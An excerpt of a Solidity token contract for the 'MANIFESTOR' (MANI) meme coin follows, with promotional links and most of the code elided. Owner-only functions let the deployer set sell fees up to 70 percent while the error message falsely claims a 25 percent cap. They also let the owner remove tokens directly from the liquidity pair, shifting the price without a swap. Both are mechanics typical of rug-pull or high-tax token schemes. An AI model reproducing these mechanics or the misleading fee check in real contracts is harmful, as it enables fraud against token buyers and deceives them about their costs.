...
Matt Furie's newest art piece. 

https://twitter.com/Matt_Furie/status/1782613638366494751

https://t.me/manifestoreth

https://twitter.com/manifestoreth

https://www.manifestor.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function transferFrom(
        ...
        _approve(sender, _msgSender(), tokenAllowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    ...
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, tokenAllowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    ...
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, tokenAllowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
...
contract MANIFESTOR is ERC20, Ownable {
    ...
    bool public swapEnabled = false;
     ...
     // Anti-bot / Whale Mappings & Variables
    mapping(address => uint256) private _holderLastTransferTimestamp; // Hold Last Xsfer During Launch
    ...
    // Automatic Market Maker Pairs. Xsfer could be subject ot max transfer amount.
    mapping (address => bool) public automatedMarketMakerPairs;

    constructor() ERC20("MANIFESTOR", "MANI") {
        ...
        developerWallet = address(owner()); // Developer Wallet
    ...
    function openMANIFESTOR() external onlyOwner {
        tradingActive = true;
        swapEnabled = true;
        lastLpBurnTime = block.timestamp;
    }
    
    // remove limit after token is stable
    ...
    function updateSellFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external onlyOwner {
        ...
        sellDevFee = _devFee;
        sellTotalFees = sellMarketingFee + sellLiquidityFee + sellDevFee;
        require(sellTotalFees <= 70, "Must keep fees at 25% or less");
    }
    ...
    function refurbMarketingWallet(address newMarketingWallet) external onlyOwner {
        marketingWallet = newMarketingWallet;
    }
    
    function refurbDeveloperWallet(address newWallet) external onlyOwner {
    ...
    function swapTokensForEth(uint256 tokenAmount) private {
        ...
        // Generate Unique Pair of Tokens & WETH
    ...
    function manualBurnLiquidityPairTokens(uint256 percent) external onlyOwner returns (bool){
        ...
        // Get Liquidity Pair Balance
        uint256 liquidityPairBalance = this.balanceOf(uniswapV2Pair);
        
        // Calculate Burn Amount
        uint256 amountToBurn = liquidityPairBalance * percent/10000;
        
        // Pull Tokens From Pair Liquidity and ove to Permanent Dead Address
        if (amountToBurn > 0){
            super._transfer(uniswapV2Pair, address(0xdead), amountToBurn);
        }
        
        // Sync Price As This Is Not A Swap
